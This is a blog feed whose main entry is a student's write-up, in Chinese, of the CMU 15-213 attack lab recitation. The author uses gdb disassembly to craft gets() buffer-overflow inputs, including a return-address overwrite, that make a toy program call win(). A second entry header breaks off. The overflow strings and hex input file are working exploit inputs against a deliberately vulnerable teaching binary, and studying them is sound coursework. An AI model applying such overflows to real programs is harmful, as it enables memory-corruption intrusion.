<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://salvely.github.io/blog</id>
    <title>望春风 • Posts by &#34;15-213 activity&#34; category</title>
    <link href="https://salvely.github.io/blog" />
    <updated>2024-02-29T09:20:40.000Z</updated>
    <category term="C++" />
    <category term="Arch" />
    <category term="Linux" />
    <category term="配置教程" />
    <category term="操作系统" />
    <category term="notes" />
    <category term="安装教程" />
    <category term="Debian" />
    <category term="包管理" />
    <category term="参考资料" />
    <category term="CMake" />
    <category term="Makefile" />
    <entry>
        <id>https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Attack%20lab%20recitation/</id>
        <title>15-213 Attack lab recitation</title>
        <link rel="alternate" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Attack%20lab%20recitation/"/>
        <content type="html">&lt;p&gt;输入 &lt;code&gt;gdb activity&lt;/code&gt; ，开启 activity 之旅。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Objective: The goal of this activity is to input a string that causes the program to call win(0x15213),&lt;br&gt;
and thereby win a cookie.&lt;br&gt;
 在开启之前，先查看一下 &lt;code&gt;solve&lt;/code&gt;  函数的内容：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;solve&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;volatile&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; before &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xb4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; buf&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;volatile&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; after &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xaf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;Gets&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buf&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;before &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x3331323531&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x15213&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;after &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x3331323831&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;win&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x18213&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;看一下 &lt;code&gt;solve&lt;/code&gt;  的汇编代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disas solve
Dump of assembler code for function solve:
   0x00000000000011df &amp;lt;+0&amp;gt;:     endbr64
   0x00000000000011e3 &amp;lt;+4&amp;gt;:     sub    $0x38,%rsp
   0x00000000000011e7 &amp;lt;+8&amp;gt;:     movq   $0xb4,0x28(%rsp)
   0x00000000000011f0 &amp;lt;+17&amp;gt;:    movq   $0xaf,0x8(%rsp)
   0x00000000000011f9 &amp;lt;+26&amp;gt;:    lea    0x10(%rsp),%rdi
   0x00000000000011fe &amp;lt;+31&amp;gt;:    callq  0x1279 &amp;lt;Gets&amp;gt;
   0x0000000000001203 &amp;lt;+36&amp;gt;:    mov    0x28(%rsp),%rdx
   0x0000000000001208 &amp;lt;+41&amp;gt;:    movabs $0x3331323531,%rax
   0x0000000000001212 &amp;lt;+51&amp;gt;:    cmp    %rax,%rdx
   0x0000000000001215 &amp;lt;+54&amp;gt;:    je     0x1230 &amp;lt;solve+81&amp;gt;
   0x0000000000001217 &amp;lt;+56&amp;gt;:    mov    0x8(%rsp),%rdx
   0x000000000000121c &amp;lt;+61&amp;gt;:    movabs $0x3331323831,%rax
   0x0000000000001226 &amp;lt;+71&amp;gt;:    cmp    %rax,%rdx
   0x0000000000001229 &amp;lt;+74&amp;gt;:    je     0x123c &amp;lt;solve+93&amp;gt;
   0x000000000000122b &amp;lt;+76&amp;gt;:    add    $0x38,%rsp
   0x000000000000122f &amp;lt;+80&amp;gt;:    retq
   0x0000000000001230 &amp;lt;+81&amp;gt;:    mov    $0x15213,%edi
   0x0000000000001235 &amp;lt;+86&amp;gt;:    callq  0x1169 &amp;lt;win&amp;gt;
   0x000000000000123a &amp;lt;+91&amp;gt;:    jmp    0x1217 &amp;lt;solve+56&amp;gt;
   0x000000000000123c &amp;lt;+93&amp;gt;:    mov    $0x18213,%edi
   0x0000000000001241 &amp;lt;+98&amp;gt;:    callq  0x1169 &amp;lt;win&amp;gt;
   0x0000000000001246 &amp;lt;+103&amp;gt;:   jmp    0x122b &amp;lt;solve+76&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;函数给 &lt;code&gt;solve&lt;/code&gt;  预留了 56 个字节的空间：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;before = 0xb4&lt;/code&gt;  移动到 &lt;code&gt;%rsp + 40&lt;/code&gt;  处&lt;/li&gt;
&lt;li&gt;&lt;code&gt;after = 0xaf&lt;/code&gt;  移动到 &lt;code&gt;%rsp + 8&lt;/code&gt;  处&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%rdi = %rsp + 16&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;调用 &lt;code&gt;gets&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%rdx = *(%rsp + 40)&lt;/code&gt; ，把 &lt;code&gt;before&lt;/code&gt;  赋给 &lt;code&gt;%rdx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%rax = $0x3331323531&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;接下来是个判断：&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rdx &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; rax&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    edi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x15213&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    callq win&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rdx &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rsp &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rax &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x3331323831&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rdx &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; rax&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  edi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x18213&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  callq win&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rsp &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;完成 &lt;code&gt;gets&lt;/code&gt;  之前的调用后，栈分布大致如下（一共 56 个字节的分配）：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;rsp&lt;/code&gt;  处没有值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsp + 8&lt;/code&gt;  处存储 &lt;code&gt;after = 0xaf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsp + 16 ~ rsp + 24&lt;/code&gt;  处存储 16 字节的 &lt;code&gt;buf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsp + 32&lt;/code&gt;  处 8 个字节空闲&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsp + 40&lt;/code&gt;  处存储 &lt;code&gt;before = 0xb4&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rsp + 56&lt;/code&gt;  处存储的是调用 &lt;code&gt;solve&lt;/code&gt;  的 &lt;code&gt;return address&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;普通缓冲区溢出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#普通缓冲区溢出&#34;&gt;#&lt;/a&gt; 普通缓冲区溢出&lt;/h3&gt;
&lt;p&gt;查看代码可以理解，要让程序调用 &lt;code&gt;win(0x15213)&lt;/code&gt; ，需要让 &lt;code&gt;rdx == 0x3331323531&lt;/code&gt; ，而在这之前 &lt;code&gt;rdx = before&lt;/code&gt; ，所以我们的根本目的是让 &lt;code&gt;before = 0x3331323531&lt;/code&gt; 。就得让 &lt;code&gt;buf&lt;/code&gt;  前 24 个字节为 0，后八个字节等于 &lt;code&gt;0x3331323531&lt;/code&gt; 。该机器为小端法机器，那么这 8 个字节从低地址到高地址的顺序应该是： &lt;code&gt;0x31 0x35 0x32 0x31 0x33 0x00 0x00 0x00&lt;/code&gt; ，这 8 个个字节翻译成 &lt;code&gt;ASCII码&lt;/code&gt; 就是 &lt;code&gt;15213&lt;/code&gt; 。此外 &lt;code&gt;gets&lt;/code&gt;  一定要读到 &lt;code&gt;\n&lt;/code&gt;  字符，它会把 &lt;code&gt;\n&lt;/code&gt;  替换为 &lt;code&gt;\0&lt;/code&gt;  字符。它不是读到 &lt;code&gt;\0&lt;/code&gt;  字符就终止。后面不需要加 &lt;code&gt;0&lt;/code&gt; ，因为 &lt;code&gt;0&lt;/code&gt;  的 &lt;code&gt;ASCII&lt;/code&gt;  编码是 &lt;code&gt;0x30&lt;/code&gt; 。如果最后加了 3 个 &lt;code&gt;0&lt;/code&gt;  的话，最后 8 个字节的地址就会变成 &lt;code&gt;0x31 0x35 0x32 0x31 0x33 0x30 0x30 0x30&lt;/code&gt; 。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;有几条要注意的点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;机器为小端法机器，写内存的时候要把数字倒过来&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x00&lt;/code&gt;  是在 ASCII 码里面是空字符， &lt;code&gt;0x30&lt;/code&gt;  在 ASCII 码里面是 &lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gets&lt;/code&gt;  要读到 &lt;code&gt;\n&lt;/code&gt; ，他会把 &lt;code&gt;\n&lt;/code&gt;  替换成 &lt;code&gt;\0&lt;/code&gt;  存储在 &lt;code&gt;buf&lt;/code&gt;  中，无需手动 &lt;code&gt;\0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;输入的时候只能输入字符串，而不能输入 10 进制或者 16 进制的值，如果函数没有调用 &lt;code&gt;atoi&lt;/code&gt; ，输入一律被当作字符串处理。因此我们需要输入 &lt;code&gt;0x3331323531&lt;/code&gt;  对应的 &lt;code&gt;ASCII&lt;/code&gt;  编码，而不是这个值本身。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;输入 &lt;code&gt;01234567890123456789012315213&lt;/code&gt; ，成功调用 &lt;code&gt;win(0x15213)&lt;/code&gt; 。如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec5/src$ ./activity
01234567890123456789012315213
You win 1 cookie! Great start!
Returning normally from main
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;包含返回地址攻击的缓冲区溢出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#包含返回地址攻击的缓冲区溢出&#34;&gt;#&lt;/a&gt; 包含返回地址攻击的缓冲区溢出&lt;/h3&gt;
&lt;p&gt;要让这个 &lt;code&gt;solve&lt;/code&gt;  函数跳转到我们插入的代码段（未开启栈随机化 / &lt;code&gt;canary&lt;/code&gt; / &lt;code&gt;NX bit&lt;/code&gt;  及其他防护机制，不考虑 &lt;code&gt;nop sled&lt;/code&gt; ），我们需要利用缓冲区溢出，让 &lt;code&gt;return address&lt;/code&gt;  修改为我们所插入的代码段的地址。我们需要让 &lt;code&gt;buf&lt;/code&gt;  的前 40 个字节为任意内容，最后 8 个字节为我们插入的攻击代码的地址。&lt;/p&gt;
&lt;p&gt;我们这次的目的是想调到 &lt;code&gt;&amp;lt;solve +93&amp;gt;&lt;/code&gt;  位置处，本次运行过程中该位置的地址是 &lt;code&gt;0x000055555555523c&lt;/code&gt; ，过会儿我们要将其插入 &lt;code&gt;buf&lt;/code&gt;  的第 48-48 字节处。该地址的值换算成小端法是 &lt;code&gt;0x3c 0x52 0x55 0x55 0x55 0x55 0x00 0x00&lt;/code&gt; 。其对应的 &lt;code&gt;ASCII码&lt;/code&gt; 是 &lt;code&gt;&amp;lt;RUUUU&lt;/code&gt; ，后面的 &lt;code&gt;null&lt;/code&gt;  为 &lt;code&gt;0x00&lt;/code&gt; 。我们要让程序返回的时候跳转到 &lt;code&gt;mov $0x18213,%edi&lt;/code&gt; 。那么构造的字符串应该是 &lt;code&gt;0123456789012345678901234567890123456789&amp;lt;RUUUU&lt;/code&gt; 。结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;43          if (after == 0x3331323831) &amp;#123;
(gdb) n
solve () at activity.c:44
44              win(0x18213);
(gdb)
You win 2 cookies! Woohoo!
0x0000000000000000 in ?? ()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功！&lt;/p&gt;
&lt;h3 id=&#34;引导程序到攻击代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#引导程序到攻击代码&#34;&gt;#&lt;/a&gt; 引导程序到攻击代码&lt;/h3&gt;
&lt;p&gt;此处我们进行更进阶的攻击，程序中函数 &lt;code&gt;solve()&lt;/code&gt;  并未调用过 &lt;code&gt;win(0x18613)&lt;/code&gt; ，让我们尝试返回到 &lt;code&gt;win(0x18613)&lt;/code&gt;  中。此时我们不光只破解 &lt;code&gt;solve()&lt;/code&gt; ，还需要对 &lt;code&gt;win&lt;/code&gt;  函数的代码进行分析。结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disas win
Dump of assembler code for function win:
   0x0000555555555169 &amp;lt;+0&amp;gt;:     endbr64
   0x000055555555516d &amp;lt;+4&amp;gt;:     sub    $0x8,%rsp
   0x0000555555555171 &amp;lt;+8&amp;gt;:     cmp    $0x15213,%edi
   0x0000555555555177 &amp;lt;+14&amp;gt;:    je     0x5555555551a7 &amp;lt;win+62&amp;gt;
   0x0000555555555179 &amp;lt;+16&amp;gt;:    cmp    $0x18213,%edi
   0x000055555555517f &amp;lt;+22&amp;gt;:    je     0x5555555551b5 &amp;lt;win+76&amp;gt;
   0x0000555555555181 &amp;lt;+24&amp;gt;:    cmp    $0x18613,%edi
   0x0000555555555187 &amp;lt;+30&amp;gt;:    je     0x5555555551c3 &amp;lt;win+90&amp;gt;
   0x0000555555555189 &amp;lt;+32&amp;gt;:    mov    0x2ea1(%rip),%eax        # 0x555555558030 &amp;lt;mystery&amp;gt;
   0x000055555555518f &amp;lt;+38&amp;gt;:    cmp    $0x15513,%eax
   0x0000555555555194 &amp;lt;+43&amp;gt;:    je     0x5555555551d1 &amp;lt;win+104&amp;gt;
   0x0000555555555196 &amp;lt;+45&amp;gt;:    lea    0xed3(%rip),%rdi        # 0x555555556070
   0x000055555555519d &amp;lt;+52&amp;gt;:    callq  0x555555555030 &amp;lt;puts@plt&amp;gt;
   0x00005555555551a2 &amp;lt;+57&amp;gt;:    add    $0x8,%rsp
   0x00005555555551a6 &amp;lt;+61&amp;gt;:    retq
   0x00005555555551a7 &amp;lt;+62&amp;gt;:    lea    0xe5a(%rip),%rdi        # 0x555555556008
   0x00005555555551ae &amp;lt;+69&amp;gt;:    callq  0x555555555030 &amp;lt;puts@plt&amp;gt;
   0x00005555555551b3 &amp;lt;+74&amp;gt;:    jmp    0x5555555551a2 &amp;lt;win+57&amp;gt;
   0x00005555555551b5 &amp;lt;+76&amp;gt;:    lea    0xedc(%rip),%rdi        # 0x555555556098
   0x00005555555551bc &amp;lt;+83&amp;gt;:    callq  0x555555555030 &amp;lt;puts@plt&amp;gt;
   0x00005555555551c1 &amp;lt;+88&amp;gt;:    jmp    0x5555555551a2 &amp;lt;win+57&amp;gt;
   0x00005555555551c3 &amp;lt;+90&amp;gt;:    lea    0xe5e(%rip),%rdi        # 0x555555556028
   0x00005555555551ca &amp;lt;+97&amp;gt;:    callq  0x555555555030 &amp;lt;puts@plt&amp;gt;
   0x00005555555551cf &amp;lt;+102&amp;gt;:   jmp    0x5555555551a2 &amp;lt;win+57&amp;gt;
   0x00005555555551d1 &amp;lt;+104&amp;gt;:   lea    0xe78(%rip),%rdi        # 0x555555556050
   0x00005555555551d8 &amp;lt;+111&amp;gt;:   callq  0x555555555030 &amp;lt;puts@plt&amp;gt;
   0x00005555555551dd &amp;lt;+116&amp;gt;:   jmp    0x5555555551a2 &amp;lt;win+57&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们需要跳转到 &lt;code&gt;if(arg == 0x18613)&lt;/code&gt;  后面那句，也就是 &lt;code&gt;&amp;lt;win+90&amp;gt;&lt;/code&gt;  处，该条指令的地址是 &lt;code&gt;0x00005555555551c3&lt;/code&gt; ，转化成小端法是 &lt;code&gt;0xc3 0x51 0x55 0x55 0x55 0x55 0x00 0x00&lt;/code&gt; ，转化成 &lt;code&gt;ASCII码&lt;/code&gt; 也就是 &lt;code&gt;ÃQUUUU&lt;/code&gt; 。因此，我们构造的字符串应该是 &lt;code&gt;0123456789012345678901234567890123456789ÃQUUUU&lt;/code&gt; 。结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) p $rsp
$2 = (void *) 0x555555559018 &amp;lt;my_stack+4056&amp;gt;
(gdb) x/s 0x555555559018
0x555555559018 &amp;lt;my_stack+4056&amp;gt;: &amp;quot;ÃQUUUU&amp;quot;
(gdb) x/6bx 0x555555559018
0x555555559018 &amp;lt;my_stack+4056&amp;gt;: 0xc3    0x83    0x51    0x55    0x55    0x55
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里出现了一点问题，就是 &lt;code&gt;Ã&lt;/code&gt;  采用 &lt;code&gt;Unicode&lt;/code&gt;  扩展编码，其编码为 &lt;code&gt;0xc3 0x83&lt;/code&gt; ，而我们仅仅需要 &lt;code&gt;0xc3&lt;/code&gt; ，因此我们需要将 16 进制的地址写在文件里，然后用文件作为 &lt;code&gt;activity&lt;/code&gt;  的输入。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY3MuY211LmVkdS9hZnMvY3MvYWNhZGVtaWMvY2xhc3MvMTUyMTMtZjIzL3d3dy9yZWNpdGF0aW9ucy9yZWMwNF9zbGlkZXMucGRm&#34;&gt;Slides 中最后一页&lt;/span&gt;告诉我们，提供了 &lt;code&gt;hex2raw&lt;/code&gt;  脚本，可以把 16 进制值写到 &lt;code&gt;input2.txt&lt;/code&gt;  中，然后通过 &lt;code&gt;hex2raw&lt;/code&gt;  转化为 &lt;code&gt;input2.bin&lt;/code&gt; 。我们在 &lt;code&gt;input2.txt&lt;/code&gt;  中写入值 &lt;code&gt;30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 31 35 32 31 33 00 30 31 32 33 34 35 36 37 38 39 c3 51 55 55 55 55&lt;/code&gt; ，将其转化，然后输入 &lt;code&gt;./activity &amp;lt; ../inputs/input2.bin&lt;/code&gt; 。&lt;br&gt;
结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) r &amp;lt; ../inputs/input2.bin
Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/rec5/src/activity &amp;lt; ../inputs/input2.bin
You win 3 cookies! That&#39;s right!

Program received signal SIGSEGV, Segmentation fault.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功！&lt;/p&gt;
</content>
        <updated>2024-02-29T09:20:40.000Z</updated>
    </entry>
    <entry>
        <id>https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20recitation/</id>
        <title>15-213 Bomb lab recitation 记录</title>
